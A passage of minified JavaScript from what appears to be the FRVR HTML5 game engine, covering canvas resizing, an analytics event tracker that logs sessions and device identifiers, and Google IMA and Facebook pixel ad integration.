                n.topLeft = n.addChild(new B), n.top = n.addChild(new B), n.topRight = n.addChild(new B), n.bottomLeft = n.addChild(new B), n.bottom = n.addChild(new B), n.bottomRight = n.addChild(new B), n.left = n.addChild(new B), n.right = n.addChild(new B), n.center = n.addChild(new B), n.groups = [n.topLeft, n.top, n.topRight, n.left, n.center, n.right, n.bottomLeft, n.bottom, n.bottomRight], n.margins = {
                    top: 10,
                    right: 10,
                    bottom: 10,
                    left: 10
                }, t.on("resize", function() {
                    var e = t.gui.width,
                        i = t.gui.height;
                    n.topLeft.x = n.margins.left, n.topLeft.y = n.margins.top, n.top.x = e / 2, n.top.y = n.margins.top, n.topRight.x = e - n.margins.right, n.topRight.y = n.margins.top, n.left.x = n.margins.left, n.left.y = i / 2, n.center.x = e / 2, n.center.y = i / 2, n.right.x = e - n.margins.right, n.right.y = i / 2, n.bottomLeft.x = n.margins.left, n.bottomLeft.y = i - n.margins.bottom, n.bottom.x = e / 2, n.bottom.y = i - n.margins.bottom, n.bottomRight.x = e - n.margins.right, n.bottomRight.y = i - n.margins.bottom
                })
            });

        function ke(i) {
            clearTimeout(Ae);
            var n = i.instant,
                r = xe(),
                o = Se();
            void 0 !== i.forced_width && (r = i.forced_width), void 0 !== i.forced_height && (o = i.forced_height);
            var a = Math.max(o - t.styles.margins.top - t.styles.spacing.top - t.styles.spacing.bottom - t.styles.margins.bottom, 10),
                s = Math.max(r - t.styles.margins.left - t.styles.spacing.left - t.styles.spacing.right - t.styles.margins.right, 10);
            if (i.forced || Me != a || Ee != s || Ce != r || Re != o) {
                clearTimeout(Le), Ce = e.width = r, Re = e.height = o, Me = a, Ee = s;
                var l = 2 * Math.ceil(e.width / 2) * t.devicePixelRatio >> 0,
                    h = 2 * Math.ceil(e.height / 2) * t.devicePixelRatio >> 0;
                t.is.iOS && (window.scrollTo && window.scrollTo(0, -1), n || (document.body.style.height = t.renderer.view.style.height = 1 + (h / t.devicePixelRatio >> 0) + "px")), t.is.iOS ? (clearTimeout(we), n ? g() : we = setTimeout(g, 500)) : g();
                var d = targetWidth,
                    c = targetHeight,
                    u = stage.orientation;
                "dynamic" == stage.orientationMode && (u = e.width <= a ? "portrait" : "landscape"), "portrait" == u && (c = targetWidth, d = targetHeight);
                var f, p = window.forceRatio ? window.forceRatio : Math.min(Math.min(l / d, h / c), 1);
                if (LEGACY_COORD_SYSTEM ? (p = window.forceRatio ? window.forceRatio : Math.min(Math.min(s * t.devicePixelRatio / d, a * t.devicePixelRatio / c), 1), i.forced && (stage.ratio = -1), stage.ratio != p && Te(p)) : (i.forced && (stage.resolution = -1), stage.resolution != p && Te(p)), LEGACY_COORD_SYSTEM) stage.ratio == p && stage.orientation == u || (stage.ratio = p);
                else if (stage.resolution != p || stage.orientation != u) {
                    stage.scale.set(p, p * t.devixePixelRatio), t.gui.scale.set(.5 * t.devicePixelRatio, .5 * t.devicePixelRatio);
                    t.gui.resolution = 1, stage.resolution = 1 * p
                }
                if (e.gameHeight = a, e.gameWidth = s, t.resizeAd(), LEGACY_COORD_SYSTEM) stage.y = t.styles.margins.top * t.devicePixelRatio - t.styles.spacing.bottom * t.devicePixelRatio;
                else t.stageContainer.dimensions = f = new Point(width * t.devicePixelRatio, height * t.devicePixelRatio), stage.dimensions = stage.toLocalSize(f), t.gui.dimensions = t.gui.toLocalSize(f), clearTimeout(Pe), Pe = setTimeout(function() {
                    t.stageContainer.applyResolutionRecursive()
                }, 300);
                stage.orientation = u, t.size = {
                    game: {
                        width: s,
                        height: a
                    },
                    target: {
                        width: d,
                        height: c
                    },
                    canvas: {
                        width: width * t.devicePixelRatio,
                        height: height * t.devicePixelRatio
                    },
                    canvasSafe: {
                        width: width - t.styles.spacing.left - t.styles.spacing.right,
                        height: height - t.styles.spacing.top - t.styles.spacing.bottom
                    },
                    stage: {
                        width: width / (stage.scale.x / t.stageContainer.scale.x),
                        height: height / (stage.scale.y / t.stageContainer.scale.y)
                    }
                }, t.emit("resize", i)
            }

            function g() {
                t.renderer.resize(l, h), t.renderer.view.style.width = (l / t.devicePixelRatio >> 0) + "px", t.renderer.view.style.height = (h / t.devicePixelRatio >> 0) + "px", t.is.android && (document.body.style.width = Math.ceil(e.width) + "px", document.body.style.height = Math.ceil(e.height) + "px"), window.dirtyOnce = !0, window.scrollTo && window.scrollTo(0, 0), t.renderer.render(t.stageContainer)
            }
        }

        function Ie(e) {
            window.inScreenshotMode || height == Se() && width == xe() || (e ? t.initComplete && window.onresize() : Ae = setTimeout(function() {
                Ie(!0)
            }, 1))
        }
        t.gui = new Ge, t.stageContainer.addChild(t.gui), t.on("force-resize", ke, {
            freezeGroup: ENG_FRZ_GRP
        }), t.on("resize", function() {
            t.once("resize", function() {
                ye()
            }, {
                freezeGroup: ENG_FRZ_GRP
            })
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), setInterval(function() {
            Ie(!1)
        }, 500), window.inScreenshotMode || (window.onunload && (window.onunload = function() {
            setTimeout(function() {
                window.onresize()
            }, 1)
        }), t.on("focus", function() {
            clearTimeout(Le), Le = setTimeout(function() {
                ke({
                    forced: t.is.iOS
                })
            }, t.is.iOS ? 500 : 1)
        }, {
            freezeGroup: ENG_FRZ_GRP
        }))
    }(this), (XS || {}).VERSION = "1.4.0",
    function(e) {
        var t = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
            i = /^\s*\-\s*/;

        function n(e) {
            return (e < 10 ? "0" : "") + e
        }

        function r() {
            return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(e) {
                var t = 16 * Math.random() | 0;
                return ("x" == e ? t : 3 & t | 8).toString(16)
            })
        }
        var o = /[-_]([a-z])/gi,
            a = /([a-z])([A-Z])|([A-Z])([A-Z])[a-z]/g;

        function s(e) {
            return e.replace(o, function(e) {
                return e[1].toUpperCase()
            })
        }

        function l(e) {
            return e.replace(a, function(e) {
                return e[0] + "_" + e.substr(1)
            }).toLowerCase()
        }

        function h() {
            var t = this;
            t.keepaliveIntervalMs = 6e4, t.keepaliveTimeoutId = void 0, t.timeStart = e && e.__FRVR && e.__FRVR.startTime || Date.now(), t.timeLoaded = void 0, t.newUserTimeoutId = void 0, t.newUserTimeoutMs = 5e3, t.handleKeepalive = t.handleKeepalive.bind(this), t.handleGameLoaded = t.handleGameLoaded.bind(this), t.handleFBInstantStart = t.handleFBInstantStart.bind(this), t.handleNewUserTimeout = t.handleNewUserTimeout.bind(this), t.handleRefreshPersistentData = t.handleRefreshPersistentData.bind(this), t.handleRefreshPlaySessionId = t.handleRefreshPlaySessionId.bind(this), t.data = {}, t.dataStore = {}, t.dataIsDirty = !0, t.providers = {}, t.DEBUG = !1, this.events = []
        }
        var d = h.prototype;
        d.init = function() {
            this.initData(), c.on("gameLoaded", this.handleGameLoaded), this.newUserTimeoutId = setTimeout(this.handleNewUserTimeout, this.newUserTimeoutMs), Host.on("FBInstantStart", this.handleFBInstantStart), this.triggerKeepalive()
        }, d.initData = function() {
            var e = h.DATAKEY,
                t = h.PERSISTENT_DATA,
                i = this,
                n = this.dataStore = {
                    app_id: "com.frvr." + Config.id,
                    app_name: Config.id,
                    app_version: Config.version,
                    app_build: Config.build,
                    play_session_count: 0,
                    cohort: this.getDate(),
                    days_elapsed: 0,
                    last_day_played: this.getDate(),
                    days_played: 0,
                    channel: this.getChannel(),
                    entry_point: void 0,
                    utm_string: this.getUtmString(),
                    play_session_id: r(),
                    play_session_id_time: Date.now(),
                    screen: "init",
                    facebook_context: void 0,
                    currency_amount: 0,
                    missions_completed: 0,
                    progression: 0,
                    games_played: 0,
                    game_start_time: -1
                };
            this.initDeviceId();
            var o = {};

            function a(e) {
                return {
                    get: function() {
                        return n[e]
                    },
                    set: function(r) {
                        return n[e] !== r && (n[e] = r, -1 === h.DATA_EXCLUDE_DIRTY.indexOf(e) && (i.dataIsDirty = !0), -1 !== t.indexOf(e) && i.savePersistentData()), n[e]
                    }
                }
            }
            for (var s in n) Object.defineProperty(i.data, s, a(s)), -1 !== t.indexOf(s) && (o[s] = n[s]);
            c.data.on("dataloaded", this.handleRefreshPersistentData), c.data.addObject(e, {
                remote: !0,
                default: o,
                merge: function(e, t) {
                    return e.cohort && t.cohort && t.cohort >= e.cohort ? t : e
                }
            }, function() {
                i.loadPersistentData()
            })
        }, d.initDeviceId = function() {
            var e = this.dataStore;

            function t(t) {
                e.deviceId = t.result
            }
            c.is.iOS && Host.IOS && Host.IOS.GetIDFA && Host.IOS.GetIDFA(t), c.is.android && Host.GoogleAds && Host.GoogleAds.GetIDFA && Host.GoogleAds.GetIDFA(t)
        }, d.loadPersistentData = function() {
            for (var e = h.DATAKEY, t = h.PERSISTENT_DATA, i = this.dataStore, n = c.data[e] || {}, r = !1, o = 0; o < t.length; o++) {
                var a = t[o];
                i[a] !== n[a] && (i[a] = n[a], r = !0, this.dataIsDirty = !0)
            }
            i.days_elapsed = Math.floor((Date.parse(this.getDate()) - Date.parse(i.cohort)) / 864e5), r && clearTimeout(this.newUserTimeoutId)
        }, d.savePersistentData = function() {
            for (var e = h.DATAKEY, t = h.PERSISTENT_DATA, i = this.dataStore, n = c.data[e], r = !1, o = 0; o < t.length; o++) {
                var a = t[o];
                i[a] !== n[a] && (r = !0, n[a] = i[a])
            }
            r && c.data.setDirty(e)
        }, d.buildEventContext = function(e, t, i) {
            var n = this.dataStore,
                r = {
                    name: e,
                    value: t,
                    _params: i,
                    _globals: n
                };
            for (var o in i) r[o] = i[o];
            for (var o in n) r[o] = n[o];
            var a = this.data.game_start_time;
            return r.game_duration = -1 === a ? 0 : Date.now() - a, r.loading_time = this.timeLoaded - this.timeStart, r
        }, d.parseArgs = function(e, t) {
            try {
                return function(e, t) {
                    var i, n, r, o = 0;

                    function a(e) {
                        return e.length
                    }

                    function s(e) {
                        return (i[e] || e)()
                    }

                    function l(e) {
                        return function() {
                            var t = o,
                                i = e();
                            return null === i && (o = t), i
                        }
                    }

                    function h(t) {
                        return l(function() {
                            var i = t.exec(e.substr(o));
                            return null === i || 0 !== i.index ? null : (o += a(i[0]), i[1])
                        })
                    }

                    function d(e) {
                        return l(function() {
                            for (var t = [], i = 0; i < a(e); i++) {
                                if (null === (n = s(e[i]))) return n;
                                t.push(n)
                            }
                            return t
                        })
                    }

                    function c(e) {
                        return l(function() {
                            for (var t = 0; t < a(e); t++)
                                if (null !== (n = s(e[t]))) return n;
                            return null
                        })
                    }

                    function u(e, t, i) {
                        return l(function() {
                            for (var r = []; null !== (n = s(e)) && (r.push(n), null !== (n = s(t)));) !0 === i && r.push(n);
                            return r
                        })
                    }
                    i = {
                        ident: h(/([a-zA-Z_][a-zA-Z0-9_]*)/),
                        argSep: h(/(\s*,\s*)/),
                        expSep: h(/([:./])/),
                        objStart: h(/(\s*{\s*)/),
                        objEnd: h(/(\s*}\s*)/),
                        char: h(/([a-zA-Z0-9_ ]+)/),
                        numStr: h(/([0-9]+(\.[0-9]+)?)/),
                        assign: h(/(\s*\=\s*)/),
                        sQStr: h(/\'([^']*)\'/),
                        dQStr: h(/\"([^"]*)\"/),
                        number: l(function() {
                            return null !== (n = s("numStr")) ? parseFloat(n) : null
                        }),
                        string: c(["sQStr", "dQStr"]),
                        ref: l(function() {
                            return null !== (n = s("ident")) ? t[n] : null
                        }),
                        objProp: c([d(["ident", "assign", "exp"]), "ident"]),
                        objProps: u("objProp", "argSep"),
                        object: (r = d(["objStart", "objProps", "objEnd"]), l(function() {
                            if (null === (n = s(r))) return null;
                            for (var e, i, o = {}, l = n[1], h = 0; h < a(l); h++)
                                if (i = "string" == typeof l[h] ? (e = l[h], t[e]) : (e = l[h][0], l[h][2]), "_merge" === e)
                                    for (var d in i) o[d] = i[d];
                                else void 0 !== i && (o[e] = i);
                            return o
                        })),
                        exp: c(["ref", "number", "string", "object"]),
                        argDef: u("exp", "expSep", !0),
                        arg: l(function() {
                            return null === (n = s("argDef")) ? n : 1 < a(n) ? n.join("") : n[0]
                        }),
                        args: u("arg", "argSep")
                    }, e = e || "";
                    var f = s("args");
                    if (o < a(e)) throw new Error("Left over tokens at " + o + ', "' + e.substr(o) + '"');
                    return f
                }(e, t)
            } catch (t) {
                throw console.error('Parse error for event mapping: "' + e + '"'), t
            }
        }, d.getDate = function() {
            var e = new Date;
            return e.getFullYear() + "-" + n(e.getMonth() + 1) + "-" + n(e.getDate())
        }, d.getDeviceID = function() {
            return this.dataStore.deviceId
        }, d.getUtmString = function() {
            if (document && document.location && document.location.search) {
                var e = document.location.search || "";
                return [(e = e.replace(/^\?/, "")).replace(/^(?:.*utm_source=([^&]*)|).*$/, "$1") || "none", e.replace(/^(?:.*utm_medium=([^&]*)|).*$/, "$1") || "none", e.replace(/^(?:.*utm_campaign=([^&]*)|).*$/, "$1") || "none"].join("_")
            }
        }, d.getChannel = function() {
            var e = "other",
                t = h.MAP_IS_TO_CHANNEL;
            for (var i in t) c.is[i] && (e = t[i]);
            return "web_safari" !== e && "web_chrome" !== e || !c.is.iOS || (e += "_ios"), e
        }, d.handleFBInstantStart = function() {
            clearTimeout(this.newUserTimeoutId), this.data.facebook_context = FBInstant.context.getType()
        }, d.triggerKeepalive = function() {
            clearTimeout(this.keepaliveTimeoutId), this.keepaliveTimeoutId = setTimeout(this.handleKeepalive, this.keepaliveIntervalMs)
        }, d.handleKeepalive = function() {
            this.keepalive()
        }, d.handleGameLoaded = function() {
            this.timeLoaded = Date.now(), this.gameLoaded()
        }, d.handleNewUserTimeout = function() {
            this.newUser()
        }, d.handleRefreshPersistentData = function(e) {
            -1 !== e.changedFields.indexOf(h.DATAKEY) && this.loadPersistentData()
        }, d.handleRefreshPlaySessionId = function(e) {
            var t = this.data.play_session_id_time,
                i = Date.now();
            (void 0 === t || i - t >= h.PLAYSESSIONID_TIMEOUT) && (this.data.play_session_id = r()), this.data.play_session_id_time = i
        }, d.addHandler = function(e, t) {
            if ("default" !== e)
                if ("object" != typeof e) {
                    var i = s(e);
                    if (e = l(e), d.hasOwnProperty(i)) throw new Error('Invalid event handler name "' + i + '", Please choose a different even name.'); - 1 === this.events.indexOf(e) && this.events.push(e), this[i] = t.bind(this)
                } else {
                    Object.keys(e).length;
                    for (var n in e) this.addHandler(n, e[n])
                }
        }, d.addProvider = function(e, t) {
            this.providers[e] = t, t.name = t.name || e;
            var i = _jsonData["track-" + t.name];
            t.config = i;
            var n = t.blacklist || "";
            t.blacklist = [], t.enabled = !1 !== t.enabled, this.updateBlacklist(e, n), this.updateBlacklist(e, i.blacklist), "string" == typeof t.blacklist && (t.blacklist = t.blacklist.split(",")), "function" != typeof t.parseArgs && "function" == typeof t.oninit && t.oninit(i, this.dataStore), t.parseArgs = this.parseArgs, t.event = this.sendProviderEvent.bind(this, t), this.addEventMapping(e, i.events)
        }, d.addEventMapping = function(e, t, i) {
            var n = this.providers[e];
            if (void 0 !== n)
                if ("object" != typeof t)
                    if (-1 === t.indexOf(",")) n.eventMap = n.eventMap || {}, t = l(t), n.eventMap[t] = i, this.hasOwnProperty(s(t)) || this.addHandler(t, this.send.bind(this, t));
                    else
                        for (var r = t.split(","), o = 0; o < r.length; o++) this.addEventMapping(e, r[o], i);
            else
                for (var a in t) this.addEventMapping(e, a, t[a]);
            else console.warn('XSTrack.addEventMapping > analytics provider "' + e + '" not found.')
        }, d.updateBlacklist = function(e, n) {
            var r = this.providers[e] || {};
            if (void 0 !== r)
                for (var o = r.blacklist, a = (n || "").split(","), s = 0; s < a.length; s++) {
                    var l = a[s].replace(t, ""),
                        h = l.replace(i, ""),
                        d = o.indexOf(h);
                    i.test(l) ? -1 !== d && o.splice(d, 1) : -1 === d && o.push(h)
                }
        }, d.sendProviderEvent = function(e, t, i, n, r) {
            if (!1 !== e.enabled && "function" == typeof e.onevent && -1 === e.blacklist.indexOf(t)) {
                var o = e.eventMap[t] || e.eventMap.default;
                void 0 !== o && e.onevent(t, i, n, r, this.parseArgs(o, r))
            }
        }, d.send = function(e, t, i) {
            "object" == typeof t && (i = t, t = void 0), i = i || {};
            var n = this.buildEventContext(e, t, i);
            for (var r in this.handleRefreshPlaySessionId(), this.providers) this.providers[r].event(e, t, i, n);
            this.triggerKeepalive()
        }, d.set = function(e, t) {
            return this.data[e] = t, t
        }, d.inc = function(e, t) {
            return this.set(e, (this.data.name || 0) + (void 0 === t ? 1 : t)), this.data.name
        }, d.updateScreen = function(e) {
            this.set("screen", e)
        }, d.updateCurrencyAmount = function(e) {
            this.set("currency_amount", e)
        }, d.updateMissionsCompleted = function(e) {
            this.set("missions_completed", e)
        }, d.updateProgression = function(e) {
            this.set("progression", e)
        }, d.event = d.customEvent = function(e, t, i) {
            this.send(e, t, i)
        }, d.error = d.errorEvent = function(e, t, i) {
            this.send("error", void 0, {
                message: e
            })
        }, h.DATAKEY = "xstrack", h.PERSISTENT_DATA = ["cohort", "play_session_id", "play_session_id_time", "play_session_count", "last_day_played", "days_played", "games_played"], h.MAP_IS_TO_CHANNEL = {
            edge: "web_edge",
            firefox: "web_firefox",
            opera: "web_opera",
            safari: "web_safari",
            chrome: "web_chrome",
            samsungBrowser: "web_samsung",
            samsungBrowserM4S: "web_samsung_m4s",
            silk: "web_silk",
            chromeWrapper: "chromeos",
            androidWrapper: "android",
            iOSWrapper: "ios",
            rcs: "rcs",
            samsungAppStore: "samsung",
            facebookInstant: "facebook_instant",
            facebookAppWeb: "facebook_canvasweb",
            facebookApp: "facebook_canvas",
            samsungBixby: "bixby",
            iMessageContext: "imessage",
            spilGamesWrapper: "spil",
            vkru: "vkru",
            okru: "okru",
            kongregate: "kongregate",
            kik: "kik",
            twitter: "twitter",
            twitch: "twitch",
            hago: "hago"
        }, h.PLAYSESSIONID_TIMEOUT = 18e5, h.DATA_EXCLUDE_DIRTY = ["play_session_id_time"], d.page = function(e, t) {
            throw new Error("DEPRECATED: XS.track.page")
        }, d.timing = function(e, t, i, n) {
            throw new Error("DEPRECATED: XS.track.timing")
        }, d.exception = function(e, t) {
            throw new Error("DEPRECATED: XS.track.exception")
        }, d.loaded = function() {
            throw new Error("DEPRECATED: XS.track.loaded")
        }, d.constructor = h;
        var c = e.XS = e.XS || {};

        function u(e) {
            var t, i, n = (e = e || {}).names || [],
                r = Array.prototype.slice.call(e.args || []),
                o = e.defaults || [],
                a = e.params;
            for (void 0 === a && "object" == typeof r[r.length - 1] && (a = r.pop()), a = a || {}, t = 0; t < r.length; t++) void 0 === a[i = n[t] || t] && (a[i] = r[t] || o[t]);
            for (t = 0; t < o.length; t++) void 0 === a[i = n[t] || t] && null != o[t] && (a[i] = o[t]);
            return a
        }
        c.XSTrack = h, c.track = new h, c.on("startLoading", function() {
                c.track.init()
            }, {
                freezeGroup: e.ENG_GRP_NAME
            }), c.track.addHandler({
                options_change: function(e, t, i) {
                    void 0 !== (i = u({
                        names: ["option_name", "option_value"],
                        args: arguments
                    })).option_name && (i.option_name = String(i.option_name)), this.send("options_change", i)
                },
                play_session_start: function() {
                    this.send("session_start", this.inc("play_session_count"))
                },
                game_end: function(e, t) {
                    t = u({
                        names: ["level_id"],
                        args: arguments
                    }), this.send("game_end", t), this.set("game_start_time", -1)
                },
                game_play_start: function(e, t) {
                    t = u({
                        names: ["level_id"],
                        args: arguments
                    }), this.set("game_start_time", Date.now()), this.inc("games_played");
                    var i = this.getDate();
                    this.data.last_day_played !== i && (this.set("last_day_played", i), this.inc("days_played")), this.send("game_play_start", 1, t)
                },
                share: function(e, t) {
                    t = u({
                        names: ["button_placement"],
                        defaults: ["none"],
                        args: arguments
                    }), this.send("share", 1, t)
                },
                invite: function(e, t) {
                    t = u({
                        names: ["button_placement"],
                        defaults: ["none"],
                        args: arguments
                    }), this.send("invite", 1, t)
                },
                socialEngage: function(e, t, i) {
                    i = u({
                        names: ["engage_id", "button_placement"],
                        defaults: [void 0, "none"],
                        args: arguments
                    }), this.send("engage", 1, i)
                },
                crossPromotionShow: function(e, t) {
                    t = u({
                        names: ["button_placement"],
                        defaults: ["none"],
                        args: arguments
                    }), this.send("cross_promotion_show", 1, t)
                },
                crossPromotionSuccess: function(e, t) {
                    t = u({
                        names: ["target_game"],
                        args: arguments
                    }), this.send("cross_promotion_success", 1, t)
                }
            }),
            function() {
                var e = {
                        interstitial: "mandatory",
                        mandatory: "mandatory",
                        reward: "rewarded",
                        rewarded: "rewarded"
                    },
                    t = {
                        mandatory: 1,
                        rewarded: 3
                    },
                    i = {
                        response: "ad_response",
                        finish: "ad_result",
                        throttled: "throttle_type"
                    };

                function n(t, i) {
                    return ["ad", e[t], i].join("_")
                }
                c.track.addHandler("ad", function(r, o, a, s, l) {
                    var h = void 0,
                        d = (l = l || {}, i[o]);
                    d ? l[d] = a : (l = s || {}, s = a, a = void 0), "finish" === o && (h = "success" === a ? t[e[r]] : 0), l.ad_point = s || "engine-triggered", this.send(n(r, o), h, l)
                });
                var r = {};
                ["interstitial", "reward"].forEach(function(e) {
                    ["request", "response", "show", "finish", "blocked", "throttled"].forEach(function(t) {
                        r[n(e, t)] = c.track.ad.bind(c.track, e, t)
                    })
                }), c.track.addHandler(r)
            }()
    }(this);
var XC = {},
    c = document.cookie.split("; ");
for (i = c.length - 1; i >= 0; i--)
    if (C = c[i].split("="), "frvr_uid" == C[0]) {
        XC.frvr_uid = C[1];
        break
    }
function Social() {
    var e = this;
    XS.data.addBoolWithLocalKey("samsungBixby", "samsungBixby.v1", {
        remote: !1
    }), XS.data.addBoolWithLocalKey("samsungGameLauncherPWA", "samsungGameLauncherPWA.v1", {
        remote: !1
    }), XS.data.addBoolWithLocalKey("samsungGalaxyStorePWA", "samsungGalaxyStorePWA.v1", {
        remote: !1
    }), XS.data.addIntWithLocalKey("fullScreenVideoCount", "fsvideocount.v2", {
        remote: !1
    }), XS.data.addIntWithLocalKey("interstitialPlayCount", "playCount8", {
        remote: !1
    }), XS.data.addBoolWithLocalKey("acontained", "acontained.v2", {
        remote: !1
    }), XS.crosspromo.init(Config.id + "_web"), (XS.is.samsungBixby || XS.data.samsungBixby) && (console.warn("Showing Samsung Bixby"), XS.data.samsungBixby = XS.is.samsungBixby = !0), (XS.is.samsungGalaxyStorePWA || XS.data.samsungGalaxyStorePWA) && (console.warn("Showing samsungGalaxyStorePWA"), XS.data.samsungGalaxyStorePWA = XS.is.samsungGalaxyStorePWA = !0), (XS.is.samsungGameLauncherPWA || XS.data.samsungGameLauncherPWA) && (console.warn("Showing samsungGameLauncherPWA"), XS.data.samsungGameLauncherPWA = XS.is.samsungGameLauncherPWA = !0), XS.is.facebookApp && (window.gaPath += "app/facebook/"), XS.is.pwa && (window.gaPath += "app/pwa/"), XS.is.windowsApp && (window.gaPath += "app/windowsapp/"), XS.is.okru && (window.gaPath += "app/okru/"), XS.is.vkru && (window.gaPath += "app/vk/"), XS.is.rcs && (window.gaPath += "app/rcs/"), XS.is.huawei && (window.gaPath += "app/huawei/"), XS.is.miniclip && (window.gaPath += "app/miniclip/");
    var t, i, n, r, o, a = XS.is.samsungBixby || XS.is.rcs || XS.is.miniclip || XS.is.samsungBrowser || XS.is.samsungGalaxyStorePWA || XS.is.samsungGameLauncherPWA || XS.is.samsungBrowserUK || XS.is.samsungBrowserUS || XS.is.samsungBrowserSEA || XS.is.mozilla || XS.is.spilGamesWrapper || XS.is.partnerGamesWrapperId;

    function s(e, t, i) {
        var n = XS.is.mobile ? "video_text_image" : "video_text_image_flash";
        return i && (n = "text_image"), XS.is.samsungBixby && (n = "video_image", i && (n = "text_image")), e = e.split("{$ADTYPE}").join(n), t && (e = e.split("{$CHANNEL}").join(t)), e = e.split("{$GAMENAME}").join(Config.id)
    }
    XS.is.okru || (t = window, i = document, t.fbq || (n = t.fbq = function() {
        n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
    }, t._fbq || (t._fbq = n), n.push = n, n.loaded = !0, n.version = "2.0", n.queue = [], (r = i.createElement("script")).async = !0, r.src = "", (o = i.getElementsByTagName("script")[0]).parentNode.insertBefore(r, o)), fbq("init", "1361622040527227"), fbq("track", "PageView"), T());
    var l = "https://googleads.g.doubleclick.net/pagead/ads?ad_type={$ADTYPE}&client=ca-games-pub-6389174903462367&description_url=https%3A%2F%2F{$GAMENAME}.frvr.com%2F&channel={$CHANNEL}&hl=en&max_ad_duration=30000&skippable_max_ad_duration=3000000",
        h = "https://googleads.g.doubleclick.net/pagead/ads?ad_type={$ADTYPE}&client=ca-games-pub-6389174903462367&description_url=https%3A%2F%2F{$GAMENAME}.frvr.com%2F&channel={$CHANNEL}&hl=en&&max_ad_duration=30000&skippable_max_ad_duration=3000000&adsafe=high";

    function d(e) {
        var t, i;
        return Config.googleAdSiteId && (t = s(l, Config.googleAdSiteId, e)), XS.is.spilGamesWrapper && Config.googleAdSpilgamesId && (t = s(h, Config.googleAdSpilgamesId, e)), (i = XS.is.partnerGamesWrapperId) && (t = s(l, i, e)), XS.is.samsungBrowser && (t = s(l, "3660984936", e)), XS.is.rcs && (t = s(l, "3217022605", e)), XS.is.huawei && (t = s(l, "4822698373", e)), XS.is.miniclip && (t = s(l, "8532226134", e)), XS.is.samsungBrowserSEA && (t = s(l, "2765561693", e)), XS.is.samsungBrowserUS && (t = s(l, "1526015108", e)), XS.is.samsungBrowserUK && (t = s(l, "2961002817", e)), XS.is.mozilla && (t = s(l, "9508446909", e)), XS.is.samsungBixby && (t = s(l, "7640790291", e)), XS.is.samsungGalaxyStorePWA && (t = s(l, "7430391555", e)), XS.is.samsungGameLauncherPWA && (t = s(l, "9997971842", e)), (i = XS.is.partnerGamesWrapperId) && (t = s(l, i, e)), t
    }
    var c = 1;

    function u() {
        c = Math.min(Math.min(document.documentElement.clientWidth / 480, document.documentElement.clientHeight / 360), 1)
    }

    function f(e, t, i) {
        if (window.google && window.google.ima) {
            var n, r, o = document.getElementById("gameCanvas");
            o.currentTime = ((new Date).getTime() - initTime) / 1e3 > 0, o.duration = 36e5;
            var a = document.createElement("div");
            a.style.position = "absolute", a.style.zIndex = 10, a.style.transform = "scale(" + c + ")", document.body.appendChild(a);
            try {
                r = new google.ima.AdDisplayContainer(a);
                var s = new google.ima.AdsLoader(r);
                s.addEventListener(google.ima.AdsManagerLoadedEvent.Type.ADS_MANAGER_LOADED, function(e) {
                    XS.track.ad("interstitial", "response", "success", void 0, {
                        provider: "legacy-adsense"
                    });
                    var t = new google.ima.AdsRenderingSettings;

                    function i() {
                        r.initialize();
                        try {
                            XS.track.ad("interstitial", "show", void 0, {
                                provider: "legacy-adsense"
                            }), n.init(Math.max(Math.ceil(document.documentElement.clientWidth / c), 100), Math.max(Math.ceil(document.documentElement.clientHeight / c), 100), google.ima.ViewMode.FULLSCREEN), n.start()
                        } catch (e) {
                            XS.track.ad("interstitial", "finish", "error", void 0, {
                                provider: "legacy-adsense"
                            }), f(e)
                        }
                    }
                    t.restoreCustomPlaybackStateOnAdBreakComplete = !1, (n = e.getAdsManager(o, t)).addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, p), n.addEventListener(google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED, m), n.addEventListener(google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED, y), n.addEventListener(google.ima.AdEvent.Type.ALL_ADS_COMPLETED, u), n.addEventListener(google.ima.AdEvent.Type.LOADED, u), n.addEventListener(google.ima.AdEvent.Type.STARTED, u), n.addEventListener(google.ima.AdEvent.Type.COMPLETE, u), n.addEventListener(google.ima.AdEvent.Type.SKIPPED, u), i(), window.playAds = i
                }, !1), s.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, function(e) {
                    XS.track.ad("interstitial", "response", "error", void 0, {
                        provider: "legacy-adsense"
                    }), v(e)
                }, !1);
                var l = new google.ima.AdsRequest;
                l.forceNonLinearFullSlot = !0, l.adTagUrl = d(i), l.linearAdSlotWidth = width * XS.devicePixelRatio, l.linearAdSlotHeight = height * XS.devicePixelRatio, l.nonLinearAdSlotWidth = width * XS.devicePixelRatio, l.nonLinearAdSlotHeight = height * XS.devicePixelRatio, XS.track.ad("interstitial", "request", void 0, {
                    provider: "legacy-adsense"
                }), s.requestAds(l)
            } catch (e) {
                return console.warn("Ad display failed", e), XS.track.ad("interstitial", "response", "error", void 0, {
                    provider: "legacy-adsense"
                }), void h()
            }
        } else XS.track.ad("interstitial", "blocked", void 0, {
            provider: "legacy-adsense"
        });

        function h() {
            document.body.removeChild(a), e(), n && n.destroy()
        }

        function u(e) {
            switch (e.type) {
                case google.ima.AdEvent.Type.ALL_ADS_COMPLETED:
                case google.ima.AdEvent.Type.COMPLETE:
                    XS.track.ad("interstitial", "finish", "success", void 0, {
                        provider: "legacy-adsense"
                    });
                    break;
                case google.ima.AdEvent.Type.SKIPPED:
                    XS.track.ad("interstitial", "finish", "skipped", void 0, {
                        provider: "legacy-adsense"
                    })
            }
        }

        function f(e) {
            console.warn("GA ERROR > " + e), h()
        }

        function p(e) {
            XS.track.ad("interstitial", "finish", "error", void 0, {
                provider: "legacy-adsense"
            }), v(e)
        }

        function v(e) {
            f(JSON.stringify(e.getError()))
        }

        function m() {
            XS.emit("blur", {
                id: "gaAdvertisement"
            }), t(), console.warn("Advertisement is requesting that game is paused."), g = (new Date).getTime()
        }

        function y() {
            h(), console.warn("Advertisement is requesting that game is resumed."), "mahjong" == Config.id && (new Image(1, 1).src = "//www.googleadservices.com/pagead/conversion/957806883/?label=wIQuCLCU93IQo_LbyAM")
        }
    }
    XS.on("resize", u), u();
    var p = !0,
        g = 0,
        v = !1;

    function m(e) {
        if (window.FAPI && XS.is.okru) return FAPI.invokeUIMethod("showMidroll"), void FAPI.invokeUIMethod("prepareMidroll");
        XS.emit("advertisementStart"), XS.freeze();
        var t = new Graphics;

        function i() {
